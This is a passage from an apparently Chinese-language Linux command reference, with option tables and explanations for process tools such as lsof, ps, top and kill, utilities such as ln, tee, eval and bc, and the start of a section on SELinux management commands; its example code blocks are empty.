<td style="text-align:center"><code>-c&lt;进程名&gt;</code></td>
<td style="text-align:left">列出指定进程所打开的文件</td>
</tr>
<tr>
<td style="text-align:center"><code>-g</code></td>
<td style="text-align:left">列出 <code>GID</code> 号进程详情</td>
</tr>
<tr>
<td style="text-align:center"><code>-d&lt;文件号&gt;</code></td>
<td style="text-align:left">列出占用该文件号的进程</td>
</tr>
<tr>
<td style="text-align:center"><code>+d&lt;目录&gt;</code></td>
<td style="text-align:left">列出目录下被打开的文件</td>
</tr>
<tr>
<td style="text-align:center"><code>+D&lt;目录&gt;</code></td>
<td style="text-align:left">递归列出目录下被打开的文件</td>
</tr>
<tr>
<td style="text-align:center"><code>-n&lt;目录&gt;</code></td>
<td style="text-align:left">列出使用 NFS 的文件</td>
</tr>
<tr>
<td style="text-align:center"><code>-i&lt;条件&gt;</code></td>
<td style="text-align:left">列出符合条件的进程。（4、6、协议、:端口、 @ip）</td>
</tr>
<tr>
<td style="text-align:center"><code>-p&lt;进程号&gt;</code></td>
<td style="text-align:left">列出指定进程号所打开的文件</td>
</tr>
<tr>
<td style="text-align:center"><code>-u</code></td>
<td style="text-align:left">列出 UID 号进程详情</td>
</tr>
<tr>
<td style="text-align:center"><code>-R</code></td>
<td style="text-align:left">列出父进程标识符</td>
</tr>
<tr>
<td style="text-align:center"><code>-h</code></td>
<td style="text-align:left">显示帮助信息</td>
</tr>
<tr>
<td style="text-align:center"><code>-v</code></td>
<td style="text-align:left">显示版本信息</td>
</tr>
</tbody>
</table>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>各个列表的含义：</p>
<ul>
<li><strong>COMMAND</strong>：进程的名称</li>
<li><strong>PID</strong>：进程标识符</li>
<li><strong>USER</strong>：进程所有者</li>
<li><strong>PGID</strong>：进程所属组</li>
<li><strong>FD</strong>：文件描述符，应用程序通过文件描述符识别该文件</li>
<li><strong>TYPE</strong>：是与文件关联的节点类型，例如：GDIR、GREG、VDIR、VREG 等。</li>
<li><strong>DEVICE</strong>：指定磁盘的名称</li>
<li><strong>SIZE</strong>：文件的大小</li>
<li><strong>NODE</strong>：索引节点（文件在磁盘上的标识）</li>
<li><strong>NAME</strong>：打开文件的确切名称</li>
</ul>
<h3> ps</h3>
<p><code>ps</code> 用于查看系统中的进程状态。语法格式：<code>ps [选项]</code></p>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-a</code></td>
<td style="text-align:left">显示所有进程（包括其他用户的进程）</td>
</tr>
<tr>
<td style="text-align:center"><code>-u</code></td>
<td style="text-align:left">用户以及其他详细信息</td>
</tr>
<tr>
<td style="text-align:center"><code>-x</code></td>
<td style="text-align:left">显示当前用户在所有终端下的进程</td>
</tr>
<tr>
<td style="text-align:center"><code>-e</code></td>
<td style="text-align:left">显示系统内的所有进程信息</td>
</tr>
<tr>
<td style="text-align:center"><code>-l</code></td>
<td style="text-align:left">使用长（long）格式显示进程信息</td>
</tr>
<tr>
<td style="text-align:center"><code>-f</code></td>
<td style="text-align:left">使用完整的（full）格式显示进程信息</td>
</tr>
<tr>
<td style="text-align:center"><code>-T</code></td>
<td style="text-align:left">查看进程下面的子线程</td>
</tr>
</tbody>
</table>
<p>Linux 系统常见的进程状态：</p>
<p><strong>R（运行）</strong>：进程正在运行或在运行队列中等待
<strong>S（中断）</strong>：进程处于休眠中，当某个条件形成后或者接收到信号时，则脱离该状态
<strong>D（不可中断）</strong>：进程不响应系统异步信号，即便用 kill 命令也不能将其中断
<strong>Z（僵死）</strong>：进程已经终止，但进程描述符依然存在，直到父进程调用 wait4() 系统函数后将进程释放
<strong>T（停止）</strong>：进程收到停止信号后停止运行</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>各个列表的含义：</p>
<ul>
<li><strong>USER</strong>：进程的属主</li>
<li><strong>PID</strong>：进程的 PID</li>
<li><strong>%CPU</strong>：进程占用的 CPU 百分比</li>
<li><strong>%MEM</strong>：占用内存的百分比</li>
<li><strong>VSZ</strong>：进程使用的虚拟內存量（KB）</li>
<li><strong>RSS</strong>：该进程占用的固定內存量（KB）（驻留中页的数量）</li>
<li><strong>TTY</strong>：该进程在哪个终端上运行（登陆者的终端位置），若与终端无关，则显示（<code>?</code>）。若为 <code>pts/0</code> 等，则表示由网络连接主机进程</li>
<li><strong>STAT</strong>：状态位常见的状态字符
<ul>
<li><strong>D</strong>：无法中断的休眠状态（通常 IO 的进程）</li>
<li><strong>R</strong>：正在运行可中在队列中可过行的</li>
<li><strong>S</strong>：处于休眠状态</li>
<li><strong>T</strong>：停止或被追踪</li>
<li><strong>W</strong>：进入内存交换 （从内核 2.6 开始无效）</li>
<li><strong>X</strong>：死掉的进程 （基本很少見）</li>
<li><strong>Z</strong>：僵尸进程</li>
<li><strong>&lt;</strong>：优先级高的进程</li>
<li><strong>N</strong>：优先级较低的进程</li>
<li><strong>L</strong>：有些页被锁进内存</li>
<li><strong>s</strong>：进程的领导者（在它之下有子进程）</li>
<li><strong>l</strong>：多进程的（使用 CLONE_THREAD, 类似 NPTL pthreads）</li>
<li><strong>+</strong>：位于前台的进程组</li>
</ul>
</li>
<li><strong>START</strong>：该进程被触发启动时间</li>
<li><strong>TIME</strong>：该进程实际使用 CPU 运行时间</li>
<li><strong>COMMAND</strong>：命令的名称和参数</li>
</ul>
<h3> pstree</h3>
<p><code>pstree</code> 用于以树状图的形式展示进程之间的关系</p>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-A</code></td>
<td style="text-align:left">各进程树之间的连接以 <code>ASCII</code> 码字符来连接</td>
</tr>
<tr>
<td style="text-align:center"><code>-U</code></td>
<td style="text-align:left">各进程树之间的连接以 <code>utf8</code> 字符来连接，某些终端可能会有错误</td>
</tr>
<tr>
<td style="text-align:center"><code>-p</code></td>
<td style="text-align:left">同时列出每个进程的 <code>PID</code></td>
</tr>
<tr>
<td style="text-align:center"><code>-u</code></td>
<td style="text-align:left">同时列出每个进程的所属账号名称</td>
</tr>
</tbody>
</table>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3> top</h3>
<p><code>top</code> 用于动态地监视进程活动及系统负载等信息。语法格式：<code>top | top [-d number] | top [-bn 3 -p 1712]</code></p>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-d</code></td>
<td style="text-align:left">number 表示页面更新的间隔秒数，默认是 5 秒</td>
</tr>
<tr>
<td style="text-align:center"><code>-b</code></td>
<td style="text-align:left">以批次的方式执行 top</td>
</tr>
<tr>
<td style="text-align:center"><code>-n</code></td>
<td style="text-align:left">与 <code>-b</code> 配合使用，表示输出的 top 结果次数</td>
</tr>
<tr>
<td style="text-align:center"><code>-p</code></td>
<td style="text-align:left">指定特定的 pid 进程号</td>
</tr>
</tbody>
</table>
<p><code>top</code> 命令显示的页面还可以输入以下按键执行相应的功能（注意大小写区分的）：</p>
<ul>
<li><strong>?</strong>：在 top 当中可以输入的命令</li>
<li><strong>d</strong>：指定 top 页面的刷新间隔</li>
<li><strong>P</strong>：以 CPU 的使用资源排序显示</li>
<li><strong>M</strong>：以内存的使用资源排序显示</li>
<li><strong>N</strong>：以 pid 排序显示</li>
<li><strong>T</strong>：由进程使用的时间累计排序显示</li>
<li><strong>k</strong>：给某一个 pid 一个信号。可以用来杀死进程</li>
<li><strong>r</strong>：给某个 pid 重新定制一个 nice 值（即优先级）</li>
<li><strong>q</strong>：退出 top（用 ctrl+c 也可以退出 top）</li>
</ul>
<p><code>top</code> 前 5 行统计信息：</p>
<p><strong>第一行</strong>：<code>top - 10:33:20 up 3 days, 17:19,  1 user,  load average: 0.00, 0.00, 0.00</code></p>
<ul>
<li><strong>10:33:20</strong>：系统时间</li>
<li><strong>up 3 days</strong>：运行时间</li>
<li><strong>1 user</strong>：登录终端数</li>
<li><strong>load average: 0.00, 0.00, 0.00</strong>：系统负载（三个值分别为 1 分钟、5 分钟、15 分钟内的平均值，数值越小负载越低）</li>
</ul>
<div class="hint-container note">
<p class="hint-container-title">注</p>
<p><strong>load average</strong>: 如果这个数除以逻辑 CPU 的数量，结果高于 <code>5</code> 的时候就表明系统在超负荷运转了</p>
</div>
<p><strong>第二行</strong>：<code>Tasks: 162 total,   1 running, 161 sleeping,   0 stopped,   0 zombie</code></p>
<ul>
<li><strong>162 total</strong>：进程总数</li>
<li><strong>1 running</strong>：运行中的进程数</li>
<li><strong>161 sleeping</strong>：睡眠中的进程数</li>
<li><strong>0 stopped</strong>：停止的进程数</li>
<li><strong>0 zombie</strong>：僵死的进程数</li>
</ul>
<p><strong>第三行</strong>：<code>%Cpu(s):  0.2 us,  0.0 sy,  0.0 ni, 99.7 id,  0.0 wa,  0.2 hi,  0.0 si,  0.0 st</code></p>
<ul>
<li><strong>0.2 us</strong>：用户空间占用 CPU 百分比</li>
<li><strong>0.0 sy</strong>：内核空间占用 CPU 百分比</li>
<li><strong>0.0 ni</strong>：用户进程空间内改变过优先级的进程占用 CPU 百分比</li>
<li><strong>99.7 id</strong>：空闲 CPU 百分比</li>
<li><strong>0.0 wa</strong>：等待输入输出的 CPU 时间百分比</li>
<li><strong>0.2 hi</strong>：硬中断（Hardware IRQ）占用 CPU 的百分比</li>
<li><strong>0.0 si</strong>：软中断（Software Interrupts）占用 CPU 的百分比</li>
<li><strong>0.0 st</strong>：用于有虚拟 CPU 的情况，用来指示被虚拟机偷掉的 CPU 时间</li>
</ul>
<p><strong>第四行</strong>：<code>MiB Mem :   1785.3 total,    684.9 free,    309.6 used,    790.9 buff/cache</code></p>
<ul>
<li><strong>1785.3 total</strong>：物理内存总量</li>
<li><strong>684.9 free</strong>：空闲内存总量</li>
<li><strong>309.6 used</strong>：使用的物理内存总量</li>
<li><strong>790.9 buff/cache</strong>：作为内核缓存的内存量</li>
</ul>
<p><strong>第五行</strong>：<code>MiB Swap:   2076.0 total,   2076.0 free,      0.0 used.   1276.2 avail Mem</code></p>
<ul>
<li><strong>2076.0 total</strong>：交换区总量</li>
<li><strong>2076.0 free</strong>：空闲交换区总量</li>
<li><strong>0.0 used</strong>：使用的交换区总量</li>
<li><strong>1276.2 avail Mem</strong>：可用于进程下一次分配的物理内存数量</li>
</ul>
<div class="hint-container note">
<p class="hint-container-title">注</p>
<p>缓冲的交换区总量：所谓缓冲的交换区总量，即内存中的内容被换出到交换区，而后又被换入到内存，但使用过的交换区尚未被覆盖，该数值即为这些内容已存在于内存中的交换区的大小。相应的内存再次被换出时可不必再对交换区写入</p>
</div>
<p>进程信息：</p>
<ul>
<li><strong>PID</strong>：进程 PID</li>
<li><strong>PPID</strong>：父进程 PID</li>
<li><strong>RUSER</strong>：真实用户名</li>
<li><strong>UID</strong>：进程所有者的用户 UID</li>
<li><strong>USER</strong>：进程所有者的用户名</li>
<li><strong>GROUP</strong>：进程所有者的组名</li>
<li><strong>TTY</strong>：启动进程的终端名。</li>
<li><strong>PR</strong>：优先级</li>
<li><strong>NI</strong>：nice 值。负值表示高优先级，正值表示低优先级</li>
<li><strong>P</strong>：最后使用的 CPU，仅在多 CPU 环境下有意义</li>
<li><strong>%CPU</strong>：上次更新到现在的 CPU 时间占用百分比</li>
<li><strong>TIME</strong>：进程使用的 CPU 时间总计，单位秒</li>
<li><strong>TIME+</strong>：进程使用的 CPU 时间总计，单位 1/100 秒</li>
<li><strong>%MEM</strong>：进程使用的物理内存百分比</li>
<li><strong>VIRT</strong>：进程使用的虚拟内存总量，单位 kb。VIRT=SWAP+RES</li>
<li><strong>SWAP</strong>：进程使用的虚拟内存中，被换出的大小，单位 kb</li>
<li><strong>RES</strong>：进程使用的、未被换出的物理内存大小，单位 kb。RES=CODE+DATA</li>
<li><strong>CODE</strong>：可执行代码占用的物理内存大小，单位 kb</li>
<li><strong>DATA</strong>：可执行代码以外的部分(数据段 + 栈)占用的物理内存大小，单位 kb</li>
<li><strong>SHR</strong>：共享内存大小，单位 kb</li>
<li><strong>nFLT</strong>：页面错误次数</li>
<li><strong>nDRT</strong>：最后一次写入到现在，被修改过的页面数。</li>
<li><strong>S</strong>：进程状态。D=不可中断的睡眠状态 R=运行 S=睡眠 T=跟踪/停止 Z=僵尸进程</li>
<li><strong>COMMAND</strong>：命令名/命令行</li>
<li><strong>WCHAN</strong>：若该进程在睡眠，则显示睡眠中的系统函数名</li>
<li><strong>Flags</strong>：任务标志</li>
</ul>
<h3> nice</h3>
<p><code>nice</code> 用于调整进程的优先级。语法格式：<code>nice 优先级数字 服务名称</code></p>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>优先级的范围：-20~19。共 40 个等级，其中数值越小优先级越高，数值越大优先级越低，即 -20 的优先级最高，19 的优先级最低</p>
</div>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-n</code></td>
<td style="text-align:left">指定优先级数</td>
</tr>
</tbody>
</table>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3> pidof</h3>
<p><code>pidof</code> 用于查询某个指定服务进程的 PID 值。语法格式：<code>pidof [选项] 服务名称</code></p>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-s</code></td>
<td style="text-align:left">仅返回一个进程号</td>
</tr>
<tr>
<td style="text-align:center"><code>-c</code></td>
<td style="text-align:left">仅显示具有相同 <code>root</code> 目录的进程</td>
</tr>
<tr>
<td style="text-align:center"><code>-x</code></td>
<td style="text-align:left">显示由脚本开启的进程</td>
</tr>
<tr>
<td style="text-align:center"><code>-o</code></td>
<td style="text-align:left">指定不显示的进程 ID</td>
</tr>
</tbody>
</table>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3> kill</h3>
<p><code>kill</code> 用于终止指定 PID 值的服务进程。语法格式：<code>kill [选项] 进程的PID</code></p>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-l</code></td>
<td style="text-align:left">信号，如果不加信号的编号选项，则使用 “-l” 选项会列出全部的信号名称</td>
</tr>
<tr>
<td style="text-align:center"><code>-a</code></td>
<td style="text-align:left">当处理当前进程时，不限制命令名和进程号的对应关系</td>
</tr>
<tr>
<td style="text-align:center"><code>-p</code></td>
<td style="text-align:left">指定 kill 命令只打印相关进程的进程号，而不发送任何信号</td>
</tr>
<tr>
<td style="text-align:center"><code>-s</code></td>
<td style="text-align:left">指定发送信号</td>
</tr>
<tr>
<td style="text-align:center"><code>-u</code></td>
<td style="text-align:left">指定用户</td>
</tr>
</tbody>
</table>
<p>信号值：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul>
<li><strong>1) SIGHUP</strong>：终端的控制进程结束，通知 session 内的各个作业，脱离关系</li>
<li><strong>2) SIGINT</strong>：中断（同 <code>Ctrl + C</code>）</li>
<li><strong>3) SIGQUIT</strong>：退出（同 <code>Ctrl + \</code>），产生 core 文件</li>
<li><strong>4) SIGILL</strong>：执行了非法指令，可执行文件本身出现错误</li>
<li><strong>5) SIGTRAP</strong>：有断点指令或其他 trap 指令产生，有 debugger 使用</li>
<li><strong>6) SIGABRT</strong>：调用 abort 函数生成的信号</li>
<li><strong>7) SIGBUS</strong>：非法地址（内存地址对齐出错）</li>
<li><strong>8) SIGFPE</strong>：致命的算术错误（浮点数运算，溢出，及除数为 <code>0</code> 错误）</li>
<li><strong>9) SIGKILL</strong>：强制终止，用来立即结束程序的运行（不能为阻塞，处理，忽略）</li>
<li><strong>10) SIGUSR1</strong>：用户使用</li>
<li><strong>11) SIGSEGV</strong>：访问内存错误</li>
<li><strong>12) SIGUSR2</strong>：用户使用</li>
<li><strong>13) SIGPIPE</strong>：管道破裂</li>
<li><strong>14) SIGALRM</strong>：时钟定时信号</li>
<li><strong>15) SIGTERM</strong>：终止（正常停止一个进程），程序结束信号（可被阻塞，处理）</li>
<li><strong>16) SIGSTKFLT</strong>：协处理器栈堆错误</li>
<li><strong>17) SIGCHLD</strong>：子进程结束，父进程收到这个信号并进行处理，（wait 也可以）否则僵尸进程</li>
<li><strong>18) SIGCONT</strong>：让一个停止的进程继续执行（不能被阻塞）</li>
<li><strong>19) SIGSTOP</strong>：让一个进程停止执行（不能被阻塞，处理，忽略）</li>
<li><strong>20) SIGTSTP</strong>：停止进程的运行（可以被处理和忽略）</li>
<li><strong>21) SIGTTIN</strong>：当后台作业要从用户终端读数据时, 该作业中的所有进程会收到 SIGTTIN 信号，缺省时这些进程会停止执行</li>
<li><strong>22) SIGTTOU</strong>：类似 SIGTTIN，但在写终端时收到</li>
<li><strong>23) SIGURG</strong>：有紧急数据或者 out—of—band 数据到达 socket 时产生</li>
<li><strong>24) SIGXCPU</strong>：超过 CPU 资源限定，这个限定可改变</li>
<li><strong>25) SIGXFSZ</strong>：当进程企图扩大文件以至于超过文件大小资源限制</li>
<li><strong>26) SIGVTALRM</strong>：虚拟时钟信号（计算的是该进程占用的 CPU 时间）</li>
<li><strong>27) SIGPROF</strong>：时钟信号（进程用的 CPU 时间及系统调用时间）</li>
<li><strong>28) SIGWINCH</strong>：窗口大小改变时发出</li>
<li><strong>29) SIGIO</strong>：文件描述符准备就绪，可以进行读写操作</li>
<li><strong>30) SIGPWR</strong>：power failure</li>
<li><strong>31) SIGSYS</strong>：非法的系统调用</li>
</ul>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>linux 的 kill 命令是向进程发送信号，kill 不是杀死的意思，<code>-9</code> 表示无条件退出，但由进程自行决定是否退出，这就是为什么 <code>kill -9</code> 终止不了系统进程和守护进程的原因</p>
</div>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3> killall</h3>
<p><code>killall</code> 用于终止指定名称服务所对应的全部进程。语法格式：<code>killall [选项] 服务名称</code></p>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-e</code> 或 <code>--exact</code></td>
<td style="text-align:left">进程需要和名字完全相符</td>
</tr>
<tr>
<td style="text-align:center"><code>-I</code> 或 <code>--ignore-case</code></td>
<td style="text-align:left">忽略大小写</td>
</tr>
<tr>
<td style="text-align:center"><code>-g</code> 或 <code>--process-group</code></td>
<td style="text-align:left">结束进程组</td>
</tr>
<tr>
<td style="text-align:center"><code>-i</code> 或 <code>--interactive</code></td>
<td style="text-align:left">结束之前询问</td>
</tr>
<tr>
<td style="text-align:center"><code>-l</code> 或 <code>--list</code></td>
<td style="text-align:left">列出所有的信号名称</td>
</tr>
<tr>
<td style="text-align:center"><code>-q</code> 或 <code>--quite</code></td>
<td style="text-align:left">进程没有结束时，不输出任何信息</td>
</tr>
<tr>
<td style="text-align:center"><code>-r</code> 或 <code>--regexp</code></td>
<td style="text-align:left">将进程名模式解释为扩展的正则表达式</td>
</tr>
<tr>
<td style="text-align:center"><code>-s</code> 或 <code>--signal</code></td>
<td style="text-align:left">发送指定信号</td>
</tr>
<tr>
<td style="text-align:center"><code>-u</code> 或 <code>--user</code></td>
<td style="text-align:left">结束指定用户的进程</td>
</tr>
<tr>
<td style="text-align:center"><code>-v</code> 或 <code>--verbose</code></td>
<td style="text-align:left">显示详细执行过程</td>
</tr>
<tr>
<td style="text-align:center"><code>-w</code> 或 <code>--wait</code></td>
<td style="text-align:left">等待所有的进程都结束</td>
</tr>
<tr>
<td style="text-align:center"><code>-V</code> 或 <code>--version</code></td>
<td style="text-align:left">显示版本信息</td>
</tr>
<tr>
<td style="text-align:center"><code>--help</code></td>
<td style="text-align:left">显示帮助信息</td>
</tr>
</tbody>
</table>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3> ln</h3>
<p><code>ln</code> 用于创建文件的软硬链接。语法格式：<code>ln [选项] 原始文件名 链接文件名</code></p>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>软链接可以对文件、目录做软链接，也可以跨文件系统</p>
<p>硬链接只能对文件做硬链接，不能跨文件系统</p>
</div>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-s</code></td>
<td style="text-align:left">创建 “软连接（符号链接）”，如果不带 <code>-s</code> 选项，则默认创建硬链接</td>
</tr>
<tr>
<td style="text-align:center"><code>-f</code></td>
<td style="text-align:left">强制创建文件或目录的链接</td>
</tr>
<tr>
<td style="text-align:center"><code>-i</code></td>
<td style="text-align:left">覆盖前先询问</td>
</tr>
<tr>
<td style="text-align:center"><code>-v</code></td>
<td style="text-align:left">显示创建链接的过程</td>
</tr>
</tbody>
</table>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3> tee</h3>
<p><code>tee</code> 用于从标准输入读取，再写入标准输出和文件。语法格式：<code>tee [OPTION] [FILE]</code></p>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-a</code></td>
<td style="text-align:left">追加到文件</td>
</tr>
<tr>
<td style="text-align:center"><code>-i</code></td>
<td style="text-align:left">忽略终端信号</td>
</tr>
<tr>
<td style="text-align:center"><code>-P</code></td>
<td style="text-align:left">诊断写入非管道的错误</td>
</tr>
<tr>
<td style="text-align:center"><code>--output-error[=MODE]</code></td>
<td style="text-align:left">设置输出错误的方式</td>
</tr>
</tbody>
</table>
<ul>
<li><strong>MODE</strong>:
<ul>
<li><strong>warn</strong>：写入遇到错误时诊断</li>
<li><strong>warn-nopipe</strong>：写入非管道遇到错误时诊断</li>
<li><strong>exit</strong>：写入遇到错误时退出</li>
<li><strong>exit-nopipe</strong>：写入非管道遇到错误时退出</li>
</ul>
</li>
</ul>
<p>如果没有指定 <code>--output-error</code>，<code>tee</code> 会在写入管道发生错误时立即退出，写入非管道时诊断</p>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3> eval</h3>
<p><code>eval</code> 会对后面的 <code>cmdLine</code> 进行两遍扫描，如果第一遍扫描后，<code>cmdLine</code> 是个普通命令，则执行此命令；如果 <code>cmdLine</code> 中含有变量，则进行对变量的替换再执行命令。语法格式：<code>eval cmdLine</code></p>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>执行 <code>eval $myfile</code> 命令时，先将 <code>$myfile</code> 替换成 <code>cat test.txt</code>，执行 <code>eval cat test.txt</code> 此命令</p>
</div>
<h3> bc</h3>
<p><code>bc</code> 是一种支持任意精度数字的语言，支持语句的交互式执行。语法格式：<code>bc [OPTION] [FILE]</code></p>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-h</code> 或 <code>–help</code></td>
<td style="text-align:left">打印此用法并退出</td>
</tr>
<tr>
<td style="text-align:center"><code>-i</code> 或 <code>–interactive</code></td>
<td style="text-align:left">强制交互模式</td>
</tr>
<tr>
<td style="text-align:center"><code>-l</code> 或 <code>–mathlib</code></td>
<td style="text-align:left">使用预定义的数学例程</td>
</tr>
<tr>
<td style="text-align:center"><code>-q</code> 或 <code>–quiet</code></td>
<td style="text-align:left">不要打印初始横幅</td>
</tr>
<tr>
<td style="text-align:center"><code>-s</code> 或 <code>–standard</code></td>
<td style="text-align:left">非标准 bc 构造是错误的</td>
</tr>
<tr>
<td style="text-align:center"><code>-w</code> 或 <code>–warn</code></td>
<td style="text-align:left">警告非标准 bc 构造</td>
</tr>
<tr>
<td style="text-align:center"><code>-v</code> 或 <code>–version</code></td>
<td style="text-align:left">打印版本信息并退出</td>
</tr>
</tbody>
</table>
<p><strong>支持的运算包括：</strong></p>
<ul>
<li><strong>+</strong>：加法</li>
<li><strong>-</strong>：减法</li>
<li><strong>*</strong>： 乘法</li>
<li><strong>/</strong>：除法</li>
<li><strong>^</strong>：指数</li>
<li><strong>%</strong>：余数</li>
</ul>
<p><strong>特殊变量说明</strong></p>
<ul>
<li><strong>浮点数精度变量 scale=10</strong>：设置之后的 <code>scale</code> 为 10，默认为 0（及整数除法会返回整数）</li>
<li><strong>进制变量 obase=16;ibase=16</strong>：设置输入和输出都为 16 进制，默认值为 10。<strong>注意</strong>：为 <code>10</code> 时可不设置 <code>ibaseobase</code> 的值，<code>obase</code> 要尽量放在 <code>ibase</code> 前面，因为 <code>ibase</code> 设置后，后面的数字都是以 <code>ibase</code> 的进制来换算的</li>
<li><strong>last</strong>：是指上一次返回出来的数字</li>
<li><strong>quit</strong>：退出计算</li>
</ul>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2> 管理 SELinux 服务命令</h2>
<h3> getenforce</h3>
<p><code>getenforce</code> 用于查看当前 <code>SELinux</code> 服务的运行模式。语法格式：<code>getenforce</code></p>
<p>SELinux 运行模式：</p>
<ul>
<li><strong>enforce</strong>：启用</li>
<li><strong>permissive</strong>：发出警告不拦截</li>
<li><strong>disabled</strong>：禁用</li>
</ul>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3> setenforce</h3>
<p><code>setenforce</code> 用于设置 SELinux 服务的运行模式。语法格式：<code>setenforce [0|1]</code></p>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>0</code></td>
<td style="text-align:left">禁用 SELinux 服务</td>
</tr>
<tr>
<td style="text-align:center"><code>1</code></td>
<td style="text-align:left">启用 SELinux 服务</td>
</tr>
</tbody>
</table>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3> semanage</h3>
<p><code>semanage</code> 用于管理 SELinux 的策略。语法格式：<code>semanage [位置参数] [选项] 文件名</code></p>
<blockquote>
<p>可以使用 <code>semanage -h</code> 查看</p>
</blockquote>
<table>
<thead>
<tr>
<th style="text-align:center">位置参数</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>import</code></td>
<td style="text-align:left">导入本地自定义</td>
</tr>
<tr>
<td style="text-align:center"><code>export</code></td>
<td style="text-align:left">输出本地自定义</td>
</tr>
<tr>
<td style="text-align:center"><code>login</code></td>
